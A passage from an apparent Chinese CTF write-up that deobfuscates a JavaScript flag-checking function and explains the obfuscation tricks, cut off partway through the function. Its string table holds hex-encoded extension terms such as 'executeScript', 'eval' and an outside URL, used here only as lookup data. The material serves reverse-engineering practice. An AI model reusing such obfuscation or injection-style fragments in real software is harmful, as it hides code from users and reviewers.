    <span class="token punctuation">}</span></code></pre><p>&#x4EE3;&#x7801;&#x91CC;&#x4E3B;&#x8981;&#x6709;&#x51E0;&#x70B9;&#x6DF7;&#x6DC6;&#xFF1A; </p> <ul> <li>1&#x3001;&#x53D8;&#x91CF;&#x540D;&#x66FF;&#x6362;&#xFF0C;a --&gt; _0xd4b7d6&#xFF0C;&#x8FD9;&#x79CD;&#x4E1C;&#x897F;&#x6700;&#x70E6;&#xFF0C;&#x4F46;&#x662F;&#x4E5F;&#x6700;&#x7B80;&#x5355;&#xFF0C;&#x6279;&#x91CF;&#x66FF;&#x6362;&#xFF0C;&#x5728;&#x6211;&#x770B;&#x6765;&#x5373;&#x4F7F;abcd&#x8FD9;&#x79CD;&#x53D8;&#x91CF;&#x4E5F;&#x6BD4;&#x8FD9;&#x4E2A;&#x5BB9;&#x6613;&#x8BFB;</li> <li>2&#x3001;&#x63D0;&#x53D6;&#x4E86;&#x6240;&#x6709;&#x7684;&#x65B9;&#x6CD5;&#x5230;&#x4E00;&#x4E2A;&#x6570;&#x7EC4;&#xFF0C;&#x8FD9;&#x79CD;&#x4E5F;&#x7B80;&#x5355;&#xFF0C;&#x53EA;&#x8981;&#x5728;chrome&#x4E2D;&#x9010;&#x6B65;&#x8C03;&#x8BD5;&#x66FF;&#x6362;&#x5C31;&#x53EF;&#x4EE5;&#x4E86;&#x3002;</li> </ul> <p> <a href="http://static.zybuluo.com/LoRexxar/jk8uuvv53ypu2p2hrywrh4lj/image.png"target="_blank"class="fancybox"rel="grouped"title=""> <img alt=""class="img-responsive lazy"data-original="http://static.zybuluo.com/LoRexxar/jk8uuvv53ypu2p2hrywrh4lj/image.png"height="100%"src="https://www.ctfwp.com/gitbook/gitbook-plugin-lazyload/loading.gif"> </a></p> <p>&#x8FD8;&#x6709;&#x4E00;&#x4E9B;&#x5C0F;&#x7684;&#x7EC6;&#x8282;&#xFF0C;&#x5F88;&#x5E38;&#x89C1;&#xFF0C;&#x6CA1;&#x4EC0;&#x4E48;&#x53EF;&#x8BF4;&#x7684;</p> <p><code><span class="token string">&quot;s&quot;</span><span class="token punctuation">.</span>length<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">--</span><span class="token operator">&gt;</span> <span class="token string">&quot;s&quot;</span><span class="token punctuation">[</span><span class="token string">&apos;length&apos;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></p> <p>&#x6700;&#x7EC8;&#x4EE3;&#x7801;&#x53EF;&#x4EE5;&#x4F18;&#x5316;&#x5230;&#x8FD9;&#x4E2A;&#x5730;&#x6B65;&#xFF0C;&#x57FA;&#x672C;&#x5DF2;&#x7ECF;&#x53EF;&#x8BFB;&#x4E86;&#xFF0C;&#x4E0B;&#x4E00;&#x6B65;&#x5C31;&#x662F;&#x5206;&#x6790;&#x4EE3;&#x7801;&#x4E86;&#x3002;</p> <pre><code>    function check<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">{</span>
        var _ <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">&apos;\x63\x6f\x64\x65&apos;</span><span class="token punctuation">,</span> <span class="token string">&apos;\x76\x65\x72\x73\x69\x6f\x6e&apos;</span><span class="token punctuation">,</span> <span class="token string">&apos;\x65\x72\x72\x6f\x72&apos;</span><span class="token punctuation">,</span> <span class="token string">&apos;\x64\x6f\x77\x6e\x6c\x6f\x61\x64&apos;</span><span class="token punctuation">,</span> <span class="token string">&apos;\x69\x6e\x76\x61\x6c\x69\x64\x4d\x6f\x6e\x65\x74\x69\x7a\x61\x74\x69\x6f\x6e\x43\x6f\x64\x65&apos;</span><span class="token punctuation">,</span> <span class="token string">&apos;\x54\x6a\x50\x7a\x6c\x38\x63\x61\x49\x34\x31&apos;</span><span class="token punctuation">,</span> <span class="token string">&apos;\x4b\x49\x31\x30\x77\x54\x77\x77\x76\x46\x37&apos;</span><span class="token punctuation">,</span> <span class="token string">&apos;\x46\x75\x6e\x63\x74\x69\x6f\x6e&apos;</span><span class="token punctuation">,</span> <span class="token string">&apos;\x72\x75\x6e&apos;</span><span class="token punctuation">,</span> <span class="token string">&apos;\x69\x64\x6c\x65&apos;</span><span class="token punctuation">,</span> <span class="token string">&apos;\x70\x79\x57\x35\x46\x31\x55\x34\x33\x56\x49&apos;</span><span class="token punctuation">,</span> <span class="token string">&apos;\x69\x6e\x69\x74&apos;</span><span class="token punctuation">,</span> <span class="token string">&apos;\x68\x74\x74\x70\x73\x3a\x2f\x2f\x74\x68\x65\x2d\x65\x78\x74\x65\x6e\x73\x69\x6f\x6e\x2e\x63\x6f\x6d&apos;</span><span class="token punctuation">,</span> <span class="token string">&apos;\x6c\x6f\x63\x61\x6c&apos;</span><span class="token punctuation">,</span> <span class="token string">&apos;\x73\x74\x6f\x72\x61\x67\x65&apos;</span><span class="token punctuation">,</span> <span class="token string">&apos;\x65\x76\x61\x6c&apos;</span><span class="token punctuation">,</span> <span class="token string">&apos;\x74\x68\x65\x6e&apos;</span><span class="token punctuation">,</span> <span class="token string">&apos;\x67\x65\x74&apos;</span><span class="token punctuation">,</span> <span class="token string">&apos;\x67\x65\x74\x54\x69\x6d\x65&apos;</span><span class="token punctuation">,</span> <span class="token string">&apos;\x73\x65\x74\x55\x54\x43\x48\x6f\x75\x72\x73&apos;</span><span class="token punctuation">,</span> <span class="token string">&apos;\x75\x72\x6c&apos;</span><span class="token punctuation">,</span> <span class="token string">&apos;\x6f\x72\x69\x67\x69\x6e&apos;</span><span class="token punctuation">,</span> <span class="token string">&apos;\x73\x65\x74&apos;</span><span class="token punctuation">,</span> <span class="token string">&apos;\x47\x45\x54&apos;</span><span class="token punctuation">,</span> <span class="token string">&apos;\x6c\x6f\x61\x64\x69\x6e\x67&apos;</span><span class="token punctuation">,</span> <span class="token string">&apos;\x73\x74\x61\x74\x75\x73&apos;</span><span class="token punctuation">,</span> <span class="token string">&apos;\x72\x65\x6d\x6f\x76\x65\x4c\x69\x73\x74\x65\x6e\x65\x72&apos;</span><span class="token punctuation">,</span> <span class="token string">&apos;\x6f\x6e\x55\x70\x64\x61\x74\x65\x64&apos;</span><span class="token punctuation">,</span> <span class="token string">&apos;\x74\x61\x62\x73&apos;</span><span class="token punctuation">,</span> <span class="token string">&apos;\x63\x61\x6c\x6c\x65\x65&apos;</span><span class="token punctuation">,</span> <span class="token string">&apos;\x61\x64\x64\x4c\x69\x73\x74\x65\x6e\x65\x72&apos;</span><span class="token punctuation">,</span> <span class="token string">&apos;\x6f\x6e\x4d\x65\x73\x73\x61\x67\x65&apos;</span><span class="token punctuation">,</span> <span class="token string">&apos;\x72\x75\x6e\x74\x69\x6d\x65&apos;</span><span class="token punctuation">,</span> <span class="token string">&apos;\x65\x78\x65\x63\x75\x74\x65\x53\x63\x72\x69\x70\x74&apos;</span><span class="token punctuation">,</span> <span class="token string">&apos;\x72\x65\x70\x6c\x61\x63\x65&apos;</span><span class="token punctuation">,</span> <span class="token string">&apos;\x64\x61\x74\x61&apos;</span><span class="token punctuation">,</span> <span class="token string">&apos;\x74\x65\x73\x74&apos;</span><span class="token punctuation">,</span> <span class="token string">&apos;\x69\x6e\x63\x6c\x75\x64\x65\x73&apos;</span><span class="token punctuation">,</span> <span class="token string">&apos;\x68\x74\x74\x70\x3a\x2f\x2f&apos;</span><span class="token punctuation">,</span> <span class="token string">&apos;\x6c\x65\x6e\x67\x74\x68&apos;</span><span class="token punctuation">,</span> <span class="token string">&apos;\x55\x72\x6c\x20\x65\x72\x72\x6f\x72&apos;</span><span class="token punctuation">,</span> <span class="token string">&apos;\x71\x75\x65\x72\x79&apos;</span><span class="token punctuation">,</span> <span class="token string">&apos;\x66\x69\x6c\x74\x65\x72&apos;</span><span class="token punctuation">,</span> <span class="token string">&apos;\x61\x63\x74\x69\x76\x65&apos;</span><span class="token punctuation">,</span> <span class="token string">&apos;\x66\x6c\x6f\x6f\x72&apos;</span><span class="token punctuation">,</span> <span class="token string">&apos;\x72\x61\x6e\x64\x6f\x6d&apos;</span><span class="token punctuation">,</span> <span class="token string">&apos;\x63\x68\x61\x72\x43\x6f\x64\x65\x41\x74&apos;</span><span class="token punctuation">,</span> <span class="token string">&apos;\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65&apos;</span><span class="token punctuation">,</span> <span class="token string">&apos;\x70\x61\x72\x73\x65&apos;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

        var head <span class="token operator">=</span> flag<span class="token punctuation">[</span><span class="token string">&apos;substring&apos;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        var base <span class="token operator">=</span> parseInt<span class="token punctuation">(</span>btoa<span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">/</span><span class="token operator">/</span><span class="token number">344800</span>


        <span class="token punctuation">(</span>function <span class="token punctuation">(</span>b<span class="token punctuation">,</span> c<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            var d <span class="token operator">=</span> function <span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">--</span>a<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        b<span class="token punctuation">[</span><span class="token string">&apos;push&apos;</span><span class="token punctuation">]</span><span class="token punctuation">(</span>b<span class="token punctuation">[</span><span class="token string">&apos;shift&apos;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span><span class="token punctuation">;</span>
            d<span class="token punctuation">(</span><span class="token operator">++</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">(</span>_<span class="token punctuation">,</span> base<span class="token operator">%</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        var g <span class="token operator">=</span> function <span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                var a <span class="token operator">=</span> parseInt<span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                var c <span class="token operator">=</span> _<span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span> c<span class="token punctuation">;</span>
            <span class="token punctuation">}</span><span class="token punctuation">;</span>

        var s2h <span class="token operator">=</span> function<span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">{</span>
            var result <span class="token operator">=</span> <span class="token string">&quot;0x&quot;</span><span class="token punctuation">;</span>
            <span class="token keyword">for</span><span class="token punctuation">(</span>var i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>str<span class="token punctuation">[</span><span class="token string">&apos;length&apos;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
                result <span class="token operator">+</span><span class="token operator">=</span> str<span class="token punctuation">[</span><span class="token string">&apos;charCodeAt&apos;</span><span class="token punctuation">]</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">&apos;toString&apos;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">return</span> result<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        var b <span class="token operator">=</span> flag<span class="token punctuation">[</span><span class="token string">&apos;split&apos;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">&quot;_&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        var c <span class="token operator">=</span> <span class="token punctuation">(</span>s2h<span class="token punctuation">(</span>b<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">&apos;substr&apos;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> s2h<span class="token punctuation">(</span>b<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">&apos;substr&apos;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> b<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">&apos;length&apos;</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">5</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>c<span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token keyword">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        b2c <span class="token operator">=</span> function<span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        var alphabet <span class="token operator">=</span> <span class="token string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ234567&quot;</span><span class="token punctuation">;</span>

        var parts <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        var quanta <span class="token operator">=</span> <span class="token constant">Math</span><span class="token punctuation">.</span>floor<span class="token punctuation">(</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span><span class="token string">&apos;length&apos;</span><span class="token punctuation">]</span> <span class="token operator">/</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        var leftover <span class="token operator">=</span> s<span class="token punctuation">[</span><span class="token string">&apos;length&apos;</span><span class="token punctuation">]</span> <span class="token operator">%</span> <span class="token number">5</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span>leftover <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">for</span> <span class="token punctuation">(</span>var i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token number">5</span> <span class="token operator">-</span> leftover<span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                s <span class="token operator">+</span><span class="token operator">=</span> <span class="token string">&apos;\x00&apos;</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            quanta <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> quanta<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            parts<span class="token punctuation">.</span>push<span class="token punctuation">(</span>alphabet<span class="token punctuation">.</span>charAt<span class="token punctuation">(</span>s<span class="token punctuation">[</span><span class="token string">&apos;charCodeAt&apos;</span><span class="token punctuation">]</span><span class="token punctuation">(</span>i <span class="token operator">*</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span><span class="token operator">&gt;</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            parts<span class="token punctuation">.</span>push<span class="token punctuation">(</span>alphabet<span class="token punctuation">.</span>charAt<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span><span class="token string">&apos;charCodeAt&apos;</span><span class="token punctuation">]</span><span class="token punctuation">(</span>i <span class="token operator">*</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x07</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>s<span class="token punctuation">[</span><span class="token string">&apos;charCodeAt&apos;</span><span class="token punctuation">]</span><span class="token punctuation">(</span>i <span class="token operator">*</span> <span class="token number">5</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span><span class="token operator">&gt;</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            parts<span class="token punctuation">.</span>push<span class="token punctuation">(</span>alphabet<span class="token punctuation">.</span>charAt<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span><span class="token string">&apos;charCodeAt&apos;</span><span class="token punctuation">]</span><span class="token punctuation">(</span>i <span class="token operator">*</span> <span class="token number">5</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x3F</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span><span class="token operator">&gt;</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            parts<span class="token punctuation">.</span>push<span class="token punctuation">(</span>alphabet<span class="token punctuation">.</span>charAt<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span><span class="token string">&apos;charCodeAt&apos;</span><span class="token punctuation">]</span><span class="token punctuation">(</span>i <span class="token operator">*</span> <span class="token number">5</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x01</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>s<span class="token punctuation">[</span><span class="token string">&apos;charCodeAt&apos;</span><span class="token punctuation">]</span><span class="token punctuation">(</span>i <span class="token operator">*</span> <span class="token number">5</span> <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span><span class="token operator">&gt;</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            parts<span class="token punctuation">.</span>push<span class="token punctuation">(</span>alphabet<span class="token punctuation">.</span>charAt<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span><span class="token string">&apos;charCodeAt&apos;</span><span class="token punctuation">]</span><span class="token punctuation">(</span>i <span class="token operator">*</span> <span class="token number">5</span> <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x0F</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>s<span class="token punctuation">[</span><span class="token string">&apos;charCodeAt&apos;</span><span class="token punctuation">]</span><span class="token punctuation">(</span>i <span class="token operator">*</span> <span class="token number">5</span> <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span><span class="token operator">&gt;</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            parts<span class="token punctuation">.</span>push<span class="token punctuation">(</span>alphabet<span class="token punctuation">.</span>charAt<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span><span class="token string">&apos;charCodeAt&apos;</span><span class="token punctuation">]</span><span class="token punctuation">(</span>i <span class="token operator">*</span> <span class="token number">5</span> <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x7F</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span><span class="token operator">&gt;</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            parts<span class="token punctuation">.</span>push<span class="token punctuation">(</span>alphabet<span class="token punctuation">.</span>charAt<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span><span class="token string">&apos;charCodeAt&apos;</span><span class="token punctuation">]</span><span class="token punctuation">(</span>i <span class="token operator">*</span> <span class="token number">5</span> <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x03</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>s<span class="token punctuation">[</span><span class="token string">&apos;charCodeAt&apos;</span><span class="token punctuation">]</span><span class="token punctuation">(</span>i <span class="token operator">*</span> <span class="token number">5</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span><span class="token operator">&gt;</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            parts<span class="token punctuation">.</span>push<span class="token punctuation">(</span>alphabet<span class="token punctuation">.</span>charAt<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span><span class="token string">&apos;charCodeAt&apos;</span><span class="token punctuation">]</span><span class="token punctuation">(</span>i <span class="token operator">*</span> <span class="token number">5</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x1F</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        var replace <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>leftover <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span>
            replace <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span>
        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>leftover <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span>
            replace <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>
        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>leftover <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span>
            replace <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>
        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>leftover <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">)</span>
            replace <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>

        <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> replace<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
            parts<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> replace<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
            parts<span class="token punctuation">.</span>push<span class="token punctuation">(</span><span class="token string">&quot;=&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">return</span> parts<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string">&quot;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        e <span class="token operator">=</span> s2h<span class="token punctuation">(</span>b2c<span class="token punctuation">(</span>b<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">&apos;split&apos;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">&quot;=&quot;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token number">0x53a3f32</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>e <span class="token operator">!=</span> <span class="token number">0x4b7c0a73</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token keyword">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        f <span class="token operator">=</span> s2h<span class="token punctuation">(</span>b2c<span class="token punctuation">(</span>b<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">&apos;split&apos;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">&quot;=&quot;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> e<span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>f <span class="token operator">!=</span> <span class="token number">0x4315332</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token keyword">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        n <span class="token operator">=</span> f<span class="token operator">*</span>e<span class="token operator">*</span>b<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">&apos;length&apos;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

        h <span class="token operator">=</span> function<span class="token punctuation">(</span>str<span class="token punctuation">,</span> func<span class="token punctuation">)</span><span class="token punctuation">{</span>
            var result <span class="token operator">=</span> <span class="token string">&quot;&quot;</span><span class="token punctuation">;</span>
            <span class="token keyword">for</span><span class="token punctuation">(</span>var i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>str<span class="token punctuation">[</span><span class="token string">&apos;length&apos;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
                result <span class="token operator">+</span><span class="token operator">=</span> func<span class="token punctuation">(</span>str<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">return</span> result<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        j <span class="token operator">=</span> b<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">&apos;split&apos;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">&quot;3&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>j<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">&apos;length&apos;</span><span class="token punctuation">]</span> <span class="token operator">!=</span> j<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">&apos;length&apos;</span><span class="token punctuation">]</span> <span class="token operator">||</span> <span class="token punctuation">(</span>s2h<span class="token punctuation">(</span>j<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">^</span>s2h<span class="token punctuation">(</span>j<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0x1613</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token keyword">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        k <span class="token operator">=</span> str <span class="token operator">=</span><span class="token operator">&gt;</span> str<span class="token punctuation">[</span><span class="token string">&apos;charCodeAt&apos;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span>b<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">&apos;length&apos;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

        l <span class="token operator">=</span> h<span class="token punctuation">(</span>j<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>k<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>l<span class="token operator">!=</span><span class="token number">0x2f9b5072</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token keyword">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        m <span class="token operator">=</span> s2h<span class="token punctuation">(</span>b<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">&apos;substr&apos;</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x48a05362</span> <span class="token operator">==</span> n<span class="token operator">%</span>l<span class="token punctuation">;</span>

